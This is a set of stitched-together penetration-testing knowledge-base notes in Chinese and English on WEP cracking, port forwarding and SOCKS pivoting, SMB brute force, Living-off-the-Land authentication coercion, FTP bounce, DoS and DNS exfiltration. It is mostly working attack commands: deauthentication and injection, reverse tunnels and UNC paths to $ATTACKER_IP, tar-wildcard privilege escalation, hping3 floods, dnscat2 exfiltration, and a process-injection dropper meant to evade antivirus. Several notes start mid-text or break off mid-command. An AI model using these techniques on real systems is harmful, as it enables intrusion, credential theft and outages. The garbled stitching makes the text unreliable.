title: 🛠️ WEP 技术笔记
content: 来源路径： 02-知识点/域与Windows/🛠️ WEP 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 🛠️ WEP 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 🛠️ WEP 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 🛠️ WEP 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：🛠️ WEP、Theory、Requirements、Find target networks、Find connected clients；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 11 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 🛠️ WEP Theory Requirements Find target networks Find connected clients Obtain an associated state Attacks Sniffing & cracking Fake 认证 De - 认证 ARP replay Fragmentation ChopChop # 核心要点 Depending on the wireless network configuration and on the context, there are different attack scenarios that can be followed but in order to carry on those attacks, there are requirements that need to be met. When using aireplay-ng for various attacks (ARP replay, fragmentation, chopchop, ...), it is possible to set the -h option along with the MAC address of an authenticated client. The authenticated clients can be gathered with airodump-ng. When no clients are connected to the AP, or when the tester doesn't want to spoof a legitimate client's MAC address to inject frames, it is required to operate a fake 认证 attack in order to associate the client with the AP. Basically, the easiest attack paths come down to the following. "Client spoofing" means using a legitimate client's MAC address with aireplay-ng's -h option when operating packet injection attacks to the router (i.e. arpreplay, fragmentation, chopchop). FYI, for the WEP cracking process, the "PTW attack" (named after its creators Pyshkin, Tews, and Weinmann) will be used in the cracking process which is much more efficient that the standard bruteforce one. spoof a legitimate client's MAC address when attacking with aireplay-ng with option -h. wait for a legitimate client to connect to the AP (or force it), capture the 认证，have airodump-ng extract the keystream from it, and use it with a known-plaintext attack to 绕过 the SKA mode requirement (.i.e the need to know the secret key). # 命令 / 载荷 / 操作片段 # 1. Find target networks 1airodump --encrypt WEP $wlan_interface # 2. Find connected clients 1airodump-ng --channel $channel --bssid 'TA:RG:ET:BS:SI:DD' $wlan_interface # 3. Sniffing & cracking 1airodump-ng --channel $channel --bssid 'TA:RG:ET:BS:SI:DD' --write $output_file $wlan_interface # 4. Sniffing & cracking 1aircrack-ng $output_file.cap # 5. Fake 认证 1aireplay-ng --fakeauth 0 -a 'TA:RG:ET:BS:SI:DD' $wlan_interface # 6. De - 认证 1aireplay-ng --deauth 10 -a 'TA:RG:ET:BS:SI:DD' $wlan_interface # 7. ARP replay 1aireplay-ng --arpreplay -b 'TA:RG:ET:BS:SI:DD' $wlan_interface # 8. Fragmentation 1aireplay-ng --fragment -F -b 'TA:RG:ET:BS:SI:DD' $wlan_interface # 9. Fragmentation 1packetforge-ng --arp -a 'TA:RG:ET:BS:SI:DD' -h 'CL:IE:NT:BS:SI:DD' -k 255.255.255.255 -l 255.255.255.255 -y $fragment_file -w crafted-packet # 10. Fragmentation 1aireplay-ng --interactive -F -r crafted-packet $wlan_interface # 11. ChopChop 1aireplay-ng --chopchop -F -b 'TA:RG:ET:BS:SI:DD' -h 'CL:IE:NT:BS:SI:DD' $wlan_interface # 工具与参考入口 Aircrack-ng source https://lesperance.io/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Depending on the template engine in use, testers will be able to fully 利用 the SSTI 漏洞. Many template engines offer a sandboxed mode for intentional template injection (to offer rich functionalities). A server-side template injection can sometimes be a feature and not a 漏洞. It's sort a dynamic port forwarding technique. Dynamic port forwarding: tunnel the whole attacker's network traffic (instead of only one port) through a remote machine. Reverse dynamic port forwarding: tunnel the whole network traffic from a remote machine through the attacker's machine. A reverse dynamic port forwarding can be also put in place to tunnel a machine's traffic through the attacker machine. It is implemented entirely in the client (i.e. the server does not need to be updated) (since OpenSSH 7.6). Working on a server/client, the binary simply needs to be uploaded on the victim host and executed as server on the attacker machine. The first steps consists in creating a route, from a meterpreter shell to the target # 命令 / 载荷 / 操作片段 # 1. Basic server setup 1ssh -N -D $PORT $CONTROLLED_TARGET # 2. Basic server setup 1ssh -N -R $PORT $CONTROLLED_TARGET # 3. Basic server setup 12345# attackerchisel server --reverse --socks5 -p $PORT# victimchisel client $ATTACKER_MACHINE_IP:$ATTACKER_MACHINE_PORT R:socks # 4. Basic server setup 1meterpreter > run autoroute -s 10.11.1.0/24 # 5. Basic server setup 1234msf > use auxiliary/server/socks_proxymsf > set SRVPORT $PORTmsf > set VERSION 4amsf > run # 6. Basic client usage 12345# type ip port [user pass]socks5 192.168.67.78 1080 lamer secretsocks4 192.168.11.49 1080http 192.168.89.33 8080 justu hiddenhttp 192.168.39.93 8080 # 工具与参考入口 since OpenSSH 7.6 Chisel proxychains-ng proxychains # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

It is used to share access to files, printers and serial ports on a network In short, SMB is the protocol, CIFS is an old dialect of SMB, and Samba is the Linux/UNIX-like implementation of the SMB protocol (see this). The null session, if not disabled, allows for anonymous/guest access to a network resource when using no 凭据 工具 like smbclient (C) and smbmap (Python) can be used to access SMB shares with null sessions. Null 凭据 do not have to be explicitly set in this case. The net cmdlet can be used to natively interact with SMB shares and explicitly set null 凭据. If null 凭据 are not explicitly set, Windows will natively use implicit 凭据 (e.g. Kerberos tickets in cache, logged on user creds or computer account) # 命令 / 载荷 / 操作片段 # 1. Null session 12345678910111213# List sharessmbclient --list //$IPsmbmap -H $IP# List shares (implicit null creds)smbclient --no-pass --list //$IP# List shares (explicit null creds)smbclient --user ''%'' --list //$IPsmbmap -u '' -p '' -H $IP# Open an interactive session to operate on a specific sharesmbclient //$IP/$SHARE_NAME # 2. Null session 1netexec smb $TARGETS -u '' -p '' --shares # 3. Null session 1net use \\$IP\$SHARE_NAME '' /user:'' # 4. Bruteforce 12345678# hydrahydra -L usernames.txt -P passwords.txt $IP -V -f smb# Metasploit module to usemsf5 > use auxiliary/scanner/smb/smb_login# nmapnmap --script smb-brute -p 445 $IP # 5. content: 来源路径： 02-知识点/域与Windows/🛠️ Port forwarding 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 🛠️ Port forwarding 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 🛠️ Port forwarding 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 🛠️ Port forwarding 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：🛠️ Port forwarding、Theory、Practice、Basic setup、Chained local port forwarding；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 🛠️ Port forwarding Theory Practice Basic setup Chained local port forwarding Chained remote port forwarding # 核心要点 This technique is useful when an attacker wants to stay under the radar or when access to a service is limited to a specific network. Remote port forwarding: access an attacker's service (from the attacker's machine's networks) from a remote workstation that can't access those networks directly. Dynamic port forwarding: tunnel the whole attacker's network traffic (instead of only one port) through a remote machine. Explained in SOCKS proxy. Reverse dynamic port forwarding: tunnel the whole network traffic from a remote machine through the attacker's machine. Explained in SOCKS proxy. The command can also be used with -N option to make sure no command gets executed after the SSH session is opened. Chisel binaries can be downloaded from the official GitHub repository. the attacker wants to stay stealthy by using multiple specific hops to make the traffic legitimate-looking (workstation communicates with an internal server, an internal server communicates with a DMZed server, a DMZed server communicates with a remote client) the target workstation doesn't have access to the remote attacker's network (i.e. to the Internet) # 命令 / 载荷 / 操作片段 # 1. Basic setup 12345# Local port forwardingssh -N -L $LOCAL_ADDRESS:$LOCAL_PORT:$REMOTE_ADDRESS:$REMOTE_PORT user@target# Remote port forwardingssh -N -R $REMOTE_ADDRESS:$REMOTE_PORT:$LOCAL_ADDRESS:$LOCAL_PORT user@target # 2. Basic setup 1234# Attacker machinechisel server -p $ATTACKER_PORT -reverse# Victime machine.\chisel.exe client $ATTACKER_IP:$ATTACKER_PORT R:$REMOTE_PORT:localhost:$LOCAL_PORT # 3. Basic setup 1234567891011# Add port forwardportfwd add –l $LOCAL_PORT –p $REMOTE_PORT –r $REMOTE_ADDRESS# List ports forwardedportfwd list# Delete port forwardedportfwd delete –l $LOCAL_PORT –p $REMOTE_PORT –r $REMOTE_ADDRESS# Remove all port forwardedportfwd flush # 4. Basic setup 1nc -lvk $LOCAL_ADDRESS $LOCAL_PORT -c "nc -v $REMOTE_ADDRESS $REMOTE_PORT" # 5. Basic setup 12345678# Expose a local HTTP service on a given port:ngrok http $LOCAL_PORT# Expose a local HTTPS server:ngrok http https://localhost# Expose raw TCP traffic on a given port:ngrok tcp $LOCAL_PORT # 工具与参考入口 the official GitHub repository Ngrok # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The next image shows a road that can be followed: The misconfiguration types can be better understood with this table: For each misconfiguration described below, check the countermeasures presented in the OAuth 2.0 Security Best Current Practice. It relies on injecting the null byte characters (%00, \x00) in the supplied data. Its role is to terminate a string. An attacker wants to retrieve the file/etc/passwd but an extension .php is appended automatically such as /etc/passwd.php. The attacker uses the null byte to terminate the string and throw away the .php extension: /etc/passwd%00 Uploading a file that is filtered by its extension. An attacker wants to 上传 a malicious.php, but the only extension allowed is .pdf. The attacker constructs the file name such as malicious.php%00.pdf and uploads the file. # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/🛠️ Living off the Land 原生工具利用.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 🛠️ Living off the Land 原生工具利用 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 🛠️ Living off the Land 原生工具利用 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 🛠️ Living off the Land 原生工具利用 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Theory、Practice、Case study 1 : Privesc using tar and a cronjob、Case study 2 : Privesc using more and sudo、Command execution；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 15 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Theory Practice Case study 1 : Privesc using tar and a cronjob Case study 2 : Privesc using more and sudo Command execution MS-SQL queries execution File explorer Internet browser HTML documents / XSS Web server 文件包含 Windows Defender Remote Scanning Certutil Trend Micro Remote Scanning Shortcut files (scf, lnk, url) PDF documents RTF documents MS Word documents MS Office uri schemes # 核心要点 Most of the 载荷 to do this on UNIX programs can be found on gtfobins.github.io. Here are two case study to better understand the principle of these privilege escalations : Notice this interesting pattern tar czvf file.tar.gz * in the script. This is a security 漏洞 because of how UNIX shells handles wildcards. Let's see an example with the ls command : https://gtfobins.github.io/gtfobins/tar/#shell To use these options in our 利用，we jut need to create these two files in our directory, as well as the 利用.sh file, containing the command we want to run when we trigger the execution : We are now ready ! We just need to wait until the directory is backup again, and it will trigger our 载荷 and execute 利用.sh file! Most of the 载荷 to do this on UNIX programs can be found on lolbas-project.github.io. In the technology world, “Living off the Land 原生工具利用” (LotL) refers to attacker behavior that uses 工具 or features that already exist in the target environment. (source) There are multiple "Living off the Land 原生工具利用" techniques that can be used to force authentications, to capture hashes, or to relay authentications. In order to use those techniques, testers need to have an initial access to "the land", i.e. the 工具 or features the technique uses. On Windows machines, cmdlets like net or dir can be used to make the machine access a remote resource, hence making it authenticate. This leads to an outgoing traffic using SMB. On MS-SQL (Microsoft SQL) servers, the EXEC method can be used to access a remote SMB share. This leads to an outgoing traffic using SMB. On Windows machines, the file explorer can be used to access remote resources like SMB shares by supplying its UNC path (i.e. \$ATTACKER IP\something) in the research bar. This leads to an outgoing traffic using SMB. HTML documents can be crafted (or injected with content when successfully exploiting an HTML injection attack such as an 跨站脚本 XSS) in way that could make browsers authenticate when accessing a remote resource. This leads to an outgoing traffic using SMB. # 命令 / 载荷 / 操作片段 # 1. Case study 1 : Privesc using tar and a cronjob 1234#!/bin/bashmkdir -p /backups/cd /var/www/html/ && tar cvzf /backups/backup_$(date +%Y_%m_%d_%Hh%M).tar.gz * # 2. Case study 1 : Privesc using tar and a cronjob 123456789101112echo '' > '--checkpoint=1'echo '' > '--checkpoint-action=exec=sh exploit.sh'$ ls -lhatotal 88Kdrwxrwxr-x 2 user user 4,0K avril 27 22:32 .drwxrwxrwt 89 user user 76K avril 27 22:31 ..-rw-rw-r-- 1 user user 0 avril 27 22:31 file1-rw-rw-r-- 1 user user 0 avril 27 22:31 file2-rw-rw-r-- 1 user user 1 avril 27 22:31 '--checkpoint=1'-rw-rw-r-- 1 user user 1 avril 27 22:32 '--checkpoint-action=exec=sh exploit.sh'-rwxrwxrwx 1 user user 784 avril 27 22:32 exploit.sh # 3. Case study 2 : Privesc using more and sudo 12345678$ sudo -l[sudo] password for user:Matching Defaults entries for user on PC1: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser user may run the following commands on PC1: (ALL : NOPASSWD) /usr/bin/more /var/log/apache2/access.log # 4. Case study 2 : Privesc using more and sudo 1sudo -u root /usr/bin/more /var/log/apache2/access.log # 5. Case study 2 : Privesc using more and sudo 12345678910$ sudo -u root /usr/bin/more /var/log/apache2/access.logFile content line 1File content line 2...File content line n------------------------!/bin/sh#uid=0(root) gid=0(root) groups=0(root)# # 6. Command execution 12dir \\$ATTACKER_IP\somethingnet use \\$ATTACKER_IP\something # 7. MS-SQL queries execution 1EXEC master.sys.xp_dirtree '\\$ATTACKER_IP\something',1,1 # 8. Windows Defender Remote Scanning 1C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\$ATTACKER_IP\file.txt # 9. Certutil 1c

For each responded host it lists IP address, NetBIOS computer name, logged-in user name and MAC address (such as Ethernet). Read the dns.md article for more insight Ping Sweep on Powershell: # 命令 / 载荷 / 操作片段 # 1. ARP discovery 1234567891011# (active) scan all private ranges (i.e. 192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8)netdiscover -i $INTERFACE# (active) scan a given range (e.g. 192.168.0.0/24)netdiscover -i $INTERFACE -r $RANGE# passive scan (doesn't send packets)netdiscover -i $INTERFACE -p# (active) scan a given rangenmap -sn $RANGE # 2. content: 来源路径： 02-知识点/域与Windows/🛠️ FTP 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 🛠️ FTP 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 🛠️ FTP 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 🛠️ FTP 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：🛠️ FTP、Theory、Basic usage、枚举、Banner grabbing；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 🛠️ FTP Theory Basic usage 枚举 Banner grabbing Accepted commands 🛠️ Files Connection Anonymous login Attacks Brute force FTP sniffing FTP Bounce attacks Scan the victim's network 下载 file/folder Steps # 核心要点 When downloading files, users should set the FTP client to "Binary" (binary command) in order to prevent files from becoming corrupted during transit. Regular text file can be downloaded in the other mode : "ASCII" (ascii command) https://www.howtoforge.com/using-wget-with-ftp-to - 下载 - move-web-sites-recursively If the FTP communications are not encrypted and if the attacker is on the same network of the client or the server he can sniff the data packet traveling between the client and the server in order to retrieve credential. FTP Bounce attacks let an attacker requests access to ports by using the FTP command PORT. It's mostly used to make a port-scan without being detected (as you are not the one doing it, but the FTP server for you), for D.o.S. attacks, or to 下载 files from another FTP server. To check if the FTP server is vulnerable to Bounce attacks it is possible to use the tool NMAP. Create the file to send to the intermediate server with the commands that the targeted server will have to execute. Let's call this file instrs. 上传 this file on the intermediate server, then 上传 it from the intermediate server to the targeted server and make the targeted machine execute this file. The attacker should have received on his server the file 'file.tar.Z' renamed as 'dump'. # 命令 / 载荷 / 操作片段 # 1. Banner grabbing 1telnet -vn $IP $PORT # 2. Anonymous login 12345$ ftp $IP $PORTName: anonymousPassword:ftp> ls -a # List all files (even hidden) (yes, they could be hidden)ftp> ... # 3. Brute force 1234567msfconsoleuse auxiliary/scanner/ftp/ftp_loginset RHOSTS $IPset RPORT $PORTset USER_FILE $user.txtset PASS_FILE $pass.txtrun # 4. Scan the victim's network 1nmap -v -b -P0 'username':'password'@'ftp_server' 'address(es)_to_scan' # 5. Steps 123456789#Start server + connectionservice pure-ftpd startftp My_IP 21ftp> USER my_own_username#Enable passive modeftp> pasvEntering Passive Mode (F,F,F,F,X,X) #Note the output (IP and port)#Tells server to accept data and to store it into the dump fileftp> stor dump # 6. Steps 12345678910user ftp # user and pass of the targeted serverpass -anonymous@cwd /DIRECTORYtype iport F,F,F,F,X,X #IP and port of the attackerretr file.tar.Zquit^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@... # 7. Steps 1234#Run these commands on the intermediate serverput instrsquote "port C,C,C,C,0,21" #IP of the targeted serverquote "retr instrs" # 工具与参考入口 https://nmap.org/nsedoc/scripts/ftp-bounce.html https://book.hacktricks.xyz/pentesting/pentesting-ftp https://shahmeeramir.com/penetration-testing-of-an-ftp-server-19afe538be4b https://www.thesecuritybuddy.com/vulnerabilities/what-is-ftp-bounce-attack/ https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

But, if a sub function is added to create a thread as follow: Once the binary is ready to be executed, access to the internet should be cut in the test environment in order not to send the signature of the 绕过 to Microsoft or to the editor. To optimize the probability to 绕过 the protections we will have to combine several techniques, for example encrypt the active load, de-activate Microsoft logs or choose a special way to inject the virus (cf process injection). # 命令 / 载荷 / 操作片段 # 1. 🛠️ Dropper 12345678static void Main(string[] args){ byte[] buf = new byte[xxx]{ 0x27, 0x3B, 0x38, 0x7D, 0xF4, 0x44 } IntPtr MyTests = OpenProcess(PROCESS_ALL_ACCESS, false, processId); IntPtr addr = VirtualAllocEx(MyTests, IntPtr.Zero, (uint)buf.Length, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(MyTests,xxxxx); IntPtr hThread = CreateRemoteThread(MyTests, xxxxxx);} # 2. 🛠️ Dropper 12345678910111213static void CRT(){ IntPtr hThread = CreateRemoteThread(MyTests, xxxxxx);}static void Main(string[] args){ byte[] buf = new byte[xxx]{ 0x27, 0x3B, 0x38, 0x7D, 0xF4, 0x44 } IntPtr MyTests = OpenProcess(PROCESS_ALL_ACCESS, false, processId); IntPtr addr = VirtualAllocEx(MyTests, IntPtr.Zero, (uint)buf.Length, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(MyTests,xxxxx); CRT()} # 工具与参考入口 @ nwodtuhs # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/🛠️ Denial of Service (DoS) 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 🛠️ Denial of Service (DoS) 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 🛠️ Denial of Service (DoS) 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 🛠️ Denial of Service (DoS) 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：🛠️ Denial of Service (DoS)、Theory、Practice、Websites；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 🛠️ Denial of Service (DoS) Theory Practice Websites # 核心要点 Distributed Denial of Service (DDoS): a DDoS attack has the same goal as the DoS attack. Except it uses a multitude of compromised machines to cause a denial of service and usually relies on flooding rather than finding and exploiting logical flaws. File 上传: exhausting the back-end system's disk space and network bandwidth by uploading lengthy files. Also, uploading a file that will be interpreted in the back-end could cause a DoS, if the file uploaded is malicious and its goal is to overload the system. The list is not exhaustive however, one can keep in mind that multiple categories exist, presenting a different approach for conducting a DoS attack: bandwidth, packets, TCP-related components, application layer, etc. Testing for DoS in engagements can be useful for detecting applications and configurations vulnerabilities, by then providing the client with possible mitigation to prevent DoS attacks. hping3 is a tool for firewall testing, OS fingerprinting, port scanning, etc. (see manual).\ Directory fuzzing is a key step during the 侦察 phase. Depending on the number of threads used, a DoS could happen. Here's an example using Feroxbuster. # 命令 / 载荷 / 操作片段 # 1. Websites 1hping3 --rand-source --flood $TARGET_IP # 2. Websites 1hping3 -S --flood -V -p $TARGET_PORT $TARGET_IP # 3. Websites 1feroxbuster -H "User-Agent: PENTEST" -w $WORDLIST -u $TARGET_IP -t $THREADS # 工具与参考入口 hping3 manual More examples on hping3. Hulk GoldenEye Feroxbuster https://www.netscout.com/what-is-ddos https://ktflash.gitbooks.io/ceh v9/content/91 dosddos concepts.html https://www.vaadata.com/blog/dos-attack-testing-denial-of-service-pentest/ https://www.acunetix.com/vulnerabilities/web/long - 密码 - denial-of-service/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/🛠️ DNS 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 🛠️ DNS 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 🛠️ DNS 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 🛠️ DNS 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：🛠️ DNS、Theory、Practice、枚举、DNS Queries；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 17 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 🛠️ DNS Theory Practice 枚举 DNS Queries Zone Transfers Subdomain 枚举 Attacks DNS Tunneling DNS Cache Snooping Post - 利用 DNS Exfiltration Finding Domain Controllers Reverse lookups Dump DNS Records in a Domain # 核心要点 DNS 枚举 involves gathering information about a domain's DNS infrastructure. This can be accomplished through various methods and 工具. Common signs of misconfiguration include: Modern DNS servers typically restrict zone transfers by default. Success usually indicates a misconfiguration. DNSRecon enables comprehensive DNS 侦察，including subdomain discovery and record analysis. DNS tunneling exploits DNS protocol for data exfiltration or command and control communication. While legitimate uses exist (e.g., software updates), the technique is often employed maliciously. AD-DS (Active Directory 域 Domain Services) rely on DNS SRV RR (service location resource records). Those records can be queried to find the location of some servers: the global catalog, LDAP servers, the Kerberos KDC and so on. If needed, the nameservers may be found with a port scan on the network by looking for DNS ports 53/TCP and 53/UDP. By default any user in Active Directory 域 can enumerate all DNS records in the Domain or Forest DNS zones, similarly to a zone transfer. So far this module only works with Administrative privileges. # 命令 / 载荷 / 操作片段 # 1. DNS Queries 12345678# Query A records (IP addresses)dig thehacker.recipes A# Query name server recordsdig thehacker.recipes NS# Trace DNS resolution pathdig thehacker.recipes +trace # 2. DNS Queries 12345678# Standard DNS querynslookup thehacker.recipes# Query mail exchange recordsnslookup -type=MX thehacker.recipes# Query specific DNS servernslookup thehacker.recipes $DNS_IP # 3. DNS Queries 12345678# Basic DNS queryhost thehacker.recipes# Query mail exchange recordshost -t MX thehacker.recipes# Reverse DNS lookuphost $IP_ADDRESS # 4. DNS Queries 12# Domain registration lookupwhois thehacker.recipes # 5. Zone Transfers 1234567891011# Basic zone transfer attemptdig axfr @$DNS_IP $DOMAIN# Zone transfer specifying name serverdig axfr $DOMAIN @ns1.$DOMAIN# Using host command for zone transferhost -t axfr $DOMAIN $DNS_IP# Alternative using fierce for zone transfersfierce --domain $DOMAIN --dns-servers $DNS_IP # 6. Subdomain 枚举 12345# Basic domain enumerationdnsrecon -d example.com# Brute force with wordlistdnsrecon -d example.com -D $WORDLIST -t std --xml $OUTPUT.xml # 7. DNS Tunneling 12345# Server configurationsudo python dnscapy_server.py $DELEGATED_ZONE_NAME $EXTERNAL_IP_ADDR# Client configurationssh -o ProxyCommand="sudo python dnscapy_client.py $DELEGATED_ZONE_NAME $IP_ADDR_OF_CLIENT_DNS" yourlogin@localhost # 8. DNS Cache Snooping 12# Perform cache snoopingdig @$DNS-SERVER $DOMAIN +norecurse # 9. DNS Exfiltration 12345# Server setupdnscat2 --dns server=$DNS_SERVER_IP:53# Client connectiondnscat2 $DOMAIN # 10. Finding Domain Controllers 12345678910111213# find the PDC (Principal Domain Controller)nslookup -type=srv _ldap._tcp.pdc._msdcs."$DOMAIN"# find the DCs (Domain Controllers)nslookup -type=srv _ldap._tcp.dc._msdcs."$DOMAIN"# find the GC (Global Catalog, i.e. DC with extended data)nslookup -type=srv gc._msdcs."$DOMAIN"# Other ways to find services hosts that may be DCsnslookup -type=srv _kerberos._tcp."$DOMAIN"nslookup -type=srv _kpasswd._tcp."$DOMAIN"nslookup -type=srv _ldap._tcp."$DOMAIN" # 11. Finding Domain Controllers 1nmap --script dns-srv-enum --script-args dns-srv-enum.domain="$DOMAIN" # 12. Finding Domain Controllers 12nmap -v -sV -p 53 "$RANGE"nmap -v -sV -sU -p 53 "$RANGE" # 13. Reverse lookups 1234567891011# standard lookuphost "$DC_HOST"# reverse lookuphost "$TARGET"# manual PTR resolution requestnslookup -type=ptr "$TARGET"# PTR restolution on a rangednsrecon -r "$RANGE" -n "$DC_IP" # 14. Dump DNS Records in a Domain 12adidnsdump -u "$DOMAIN"\\"$USER" -p "$PASSWORD" ldap://"$DC_IP" -rcat records.csv # 15. Dump DNS Records in a Domain 1bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get dnsDump # 16. Dump DNS Records in a Domain 1netexec smb "$DC_IP" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -M enum_dns # 17. Dump DNS Records in a Domain 1dig axfr @"$DC_IP

